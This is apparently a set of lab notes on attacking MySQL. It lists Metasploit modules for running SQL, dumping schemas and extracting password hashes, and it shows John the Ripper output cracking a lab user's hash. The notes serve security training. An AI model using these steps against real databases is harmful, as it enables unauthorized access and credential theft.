**What is MySQL?**
In its simplest definition, MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL)

---
Connect to MySQL distanced Database :```mysql -h [IP] -u [username] -p```

---

Metasploit module to : auxiliary/admin/mysql/mysql_sql 
Description:
  This module allows for simple SQL statements to be executed against 
  a MySQL instance given the appropriate credentials

---

Metasploit Module to : auxiliary/scanner/mysql/mysql_schemadump
Description:
  This module extracts the schema information from a MySQL DB server.

---

Metasploit Module to : auxiliary/scanner/mysql/mysql_hashdump
Description:
  This module extracts the usernames and encrypted password hashes 
  from a MySQL server and stores them for later cracking.

---

Using john the ripper to "crack" the password in mysql hash : ```

```bash
root@ip-10-10-141-82:~# john hash.txt 
	Warning: detected hash type "mysql-sha1", but the string is also recognized as "mysql-sha1-opencl"
	Use the "--format=mysql-sha1-opencl" option to force loading these as that type instead
	Using default input encoding: UTF-8
	Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
	Warning: no OpenMP support for this hash type, consider --fork=2
	Proceeding with single, rules:Single
	Press 'q' or Ctrl-C to abort, almost any other key for status
	Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
	Almost done: Processing the remaining buffered candidate passwords, if any.
	Proceeding with wordlist:/opt/john/password.lst
	Proceeding with incremental:ASCII
	doggie           (carl)
	1g 0:00:00:02 DONE 3/3 (2023-11-14 02:33) 0.4065g/s 929305p/s 929305c/s 929305C/s doggie..doggia
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed.
```
